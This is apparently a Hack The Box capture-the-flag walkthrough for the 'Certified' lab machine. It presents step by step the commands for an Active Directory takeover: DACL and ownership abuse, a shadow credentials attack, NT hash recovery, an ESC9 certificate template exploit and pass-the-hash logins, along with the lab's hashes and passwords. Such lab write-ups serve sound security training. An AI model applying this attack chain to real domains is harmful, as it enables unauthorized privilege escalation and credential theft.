---
icon: windows
---

# Certified - Medium

<figure><img src="../../.gitbook/assets/image (177).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/certified"><strong>Certified</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.41 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-11 16:03 EDT
Nmap scan report for certified.htb (10.10.11.41)
Host is up (0.039s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-12 03:11:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
|_ssl-date: 2025-10-12T03:13:08+00:00; +7h00m05s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-12T03:13:09+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-12T03:13:08+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-12T03:13:09+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
49729/tcp open  msrpc         Microsoft Windows RPC
49772/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-12T03:12:28
|_  start_date: N/A
|_clock-skew: mean: 7h00m04s, deviation: 0s, median: 7h00m04s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   52.37 ms 10.10.16.1
2   52.45 ms certified.htb (10.10.11.41)
```

We are starting with an assumed breach scenario, using credentials provided for judith mader

```
judith.mader:judith09
```

Nmap identified the domain names `certified.htb` and `dc01.certified.htb`. I will add entries for them to `/etc/hosts`

```
10.10.11.41	certified.htb dc01.certified.htb
```

I’ve already gone after the low‑hanging fruit by enumerating <mark style="color:$info;">**SMB**</mark> and <mark style="color:$info;">**LDAP**</mark> but didn’t find anything useful, so I’m switching to BloodHound next

I'll use netexec to do bloodhound collection

### <mark style="color:$primary;">Bloodhound</mark>

{% code overflow="wrap" %}
```bash
netexec ldap 10.10.11.41 -u 'judith.mader' -p 'judith09' --bloodhound --collection All --dns-server 10.10.11.41
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

Start bloodhound

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

Judith has `WriteOwner` on the management group

#### First Degree Object Control of Management Group

<figure><img src="../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

the management group has `GeneriWrite` on management\_svc

#### First Degree Object Control of management\_svc

<figure><img src="../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

management\_svc has GenericAll on the CA\_Operator.&#x20;

ca\_operator ding! This might mean that **ADCS \[Active Directory Certificate Services]** is enabled, and that this user might have permission to request certificates -> which can lead to privesc

Let's begin pivoting

### <mark style="color:$primary;">WriteOwner</mark>&#x20;

Use the WriteOwner permission to set the Owner of the Management group to be judith.mader

{% code overflow="wrap" %}
```bash
bloodyAD --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

Now grant judith.mader the WriteMembers permission, which means she can modify the members of the Management group.&#x20;

Let's read her permissions first before modifying them

{% code overflow="wrap" %}
```bash
impacket-dacledit -action 'read'  -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
impacket-dacledit -action 'write'  -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

Check to see if it worked

<figure><img src="../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

Now with Generic Write on Management Group we can add ourselves to it

### <mark style="color:$primary;">**Generic Write on Management Group**</mark>

<figure><img src="../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Now let's add judith.mader user to the Management Group

{% code overflow="wrap" %}
```bash
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "DC01.certified.htb"
```
{% endcode %}

{% code overflow="wrap" %}
```bash
net rpc group members "Management" -U "certified.htb/judith.mader%judith09" -S "DC01.certified.htb"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Generic Write on management\_svc</mark>

The method used below is called Shadow Credential attack. Using [**pywhisker**](https://github.com/ShutdownRepo/pywhisker), add `msDs-KeyCredentialLink` attribute content to the `management_svc` user

After obtaining the high-privilege user, add Shadow Credential \[msDS-KeyCredentialLink attribute] to the target user, and use the relevant attack tools to obtain the .pfx private key certificate file, and then use the .pfx file to apply for the target user's TGT, and then obtain its NTLM Hash

Before proceeding, you can see that the attribute of the management\_svc user is empty

{% code overflow="wrap" %}
```bash
python ~/tools/Windows/pywhisker/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p 'judith09' --target "management_svc" --action "list"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

Execute the modification operation. This operation will generate a pfx file in the directory, and the password corresponding to the pfx file will be given in the information.

First I will sync my \[kali]machines clock to the target machines DC

```
service virtualbox-guest-utils stop
sudo ntpdate 10.10.11.41
```

<figure><img src="../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
python ~/tools/Windows/pywhisker/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p 'judith09' --target "management_svc" --action "add"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

Don't lose this password you will need it. Otherwise you have to redo the above steps&#x20;

<figure><img src="../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

Let's check the attribute for the user again

<figure><img src="../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

Now to Obtain the TGT for management\_svc

Use the script `PKINITtools` in `gettgtpkinit.py` to request a Kerberos TGT \[Ticket Granting Ticket], and use the previously generated certificate and key

{% code overflow="wrap" %}
```bash
python ~/tools/Windows/PKINITtools/gettgtpkinit.py -cert-pfx cwdKORJF.pfx -pfx-pass jWK1VJn2isShnjybikH9 certified.htb/management_svc management_svc.ccache
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

Setup your environment variable. Try to use full paths always

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=/home/kali/CyberTraining/Test/Box/management_svc.ccache
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

Now we can use the script `getnthash.py` to request and recover the account's NT hash using the TGT you have obtained: `management_svc`

{% code overflow="wrap" %}
```bash
python ~/tools/Windows/PKINITtools/getnthash.py -key 24e0bf8c3bef3b958b320ff6cdab93959dd47a4968dc9a72bec33af2d09f3670 certified.htb/management_svc
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

Now with this hash we can login

{% code overflow="wrap" %}
```bash
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

Now if this does not work, you can also try the following

targetedKerberoast is a Python script that, like many others (e.g. [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) ), prints a "kerberoast" hash Example below

{% embed url="https://deimos-3.gitbook.io/deimos-docs/hack-the-box/active-directory/administrator-medium#genericwrite" %}

### <mark style="color:$primary;">GenericAll</mark>&#x20;

<figure><img src="../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

`management_svc` has full control over `ca_operator`. Let's change his password

{% code overflow="wrap" %}
```bash
pth-net rpc password "ca_operator" "Password123!" -U "certified.htb"/"management_svc"%"a091c1832bcdd4677c28b5a6a1295584":"a091c1832bcdd4677c28b5a6a1295584" -S "dc01.certified.htb"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

```
// Some code
```

### <mark style="color:$primary;">ADCS</mark>

```bash
netexec ldap certified.htb -u ca_operator -p Password123! -M adcs
```

<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

ADCS is running on this box, now let's check if there are any misconfigured certificates. I am going to use [**Certify**](https://github.com/GhostPack/Certify) and check them on the machine

### <mark style="color:$primary;">Checking for Misconfigured ADCS</mark>

{% code overflow="wrap" %}
```bash
certipy-ad find -u ca_operator -p 'Password123!' -dc-ip 10.10.11.41 -vulnerable -stdout
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

From the Certipy output, we can see that the ADCS setup is vulnerable to <mark style="color:red;">**ESC9**</mark>

<mark style="color:red;">**ESC9:**</mark> Certificate Templates-> CertifiedAuthentication-> Enrollment Flag, there is NoSecurityExtension

<mark style="color:yellow;">**Note:**</mark> during `BloodHound` or `Certipy` enumeration, if you a user appears in a groups like <mark style="color:$warning;">Enrollment</mark>, **Certificate Requesters**, or has <mark style="color:$warning;">**Enroll/Autoenroll**</mark> rights on a certificate template, investigate it! You might be looking at a path to <mark style="color:$success;">**domain compromise**</mark>**.**

### <mark style="color:$primary;">Abusing ESC9</mark>

<mark style="color:yellow;">**!!!Make sure that you perform the operations quick otherwise the upn will be reset!!!**</mark>

First we need to modify the UPN of ca\_operator. First, let's take a look at the current situation, which shows ca\_operator@certified.htb

{% code overflow="wrap" %}
```bash
ldapsearch -x -H ldap://10.10.11.41 -D "judith.mader@certified.htb" -w "judith09" -b "DC=certified,DC=htb" "(samAccountName=ca_operator)" userPrincipalName
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

Make modifications and change the upn of ca\_operator to Administrator

{% code overflow="wrap" %}
```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

Check the updated UPN of ca\_operator

{% code overflow="wrap" %}
```bash
ldapsearch -x -H ldap://10.10.11.41 -D "judith.mader@certified.htb" -w "judith09" -b "DC=certified,DC=htb" "(samAccountName=ca_operator)" userPrincipalName
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

You will know why we need to change the UPN in a moment. Next, we can use the ca\_operator user to obtain the admnistrator's pfx file

{% code overflow="wrap" %}
```bash
certipy-ad req -username ca_operator@certified.htb -p Password123! -ca certified-DC01-CA -template CertifiedAuthentication
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

The certificate was successfully requested and Administrator is associated with the account \[even though the request was made by ca\_operatora user]. This means that there is now a Administratorcertificate that can represent the account

#### <mark style="color:$primary;">**Restoring Original UPN**</mark>

Restored ca\_operator’s UPN to its original value

{% code overflow="wrap" %}
```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

Use the administrator.pfx file to get the administrator's hash. As mentioned earlier, if the UPN is not changed, the hash of ca\_operator is obtained here

{% code overflow="wrap" %}
```bash
certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.10.11.41
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>
